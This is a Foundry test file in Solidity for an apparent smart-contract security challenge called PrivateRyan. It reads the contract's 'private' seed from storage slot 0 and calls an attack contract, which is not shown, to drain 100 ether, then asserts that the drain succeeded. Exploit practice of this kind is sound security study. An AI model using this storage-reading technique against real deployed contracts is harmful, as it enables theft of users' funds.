// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/PrivateRyan.sol";

contract PrivateRyanTest is Test {
    PrivateRyan public privateRyan;
    PrivateRyanHack public hack;

    function setUp() public {
        privateRyan = new PrivateRyan();
        hack = new PrivateRyanHack(payable(address(privateRyan)));

        // send some ether to privateRyan
        deal(address(privateRyan), 100 ether);
        // send initial eth to pass require condition on calling spin()
        deal(address(hack), 0.02 ether);
    }

    function testHack() public {
        console.log("Attack contract balance before the attack: ", address(hack).balance / 1e18);
        // query the slot 0 to read the value of seed
        bytes32 seed = vm.load(address(privateRyan), bytes32(uint256(0)));
        hack.attack(uint256(seed));

        assertGt(address(hack).balance, 100 ether);
        console.log("Attack contract balance after the attack: ", address(hack).balance / 1e18);
    }
}
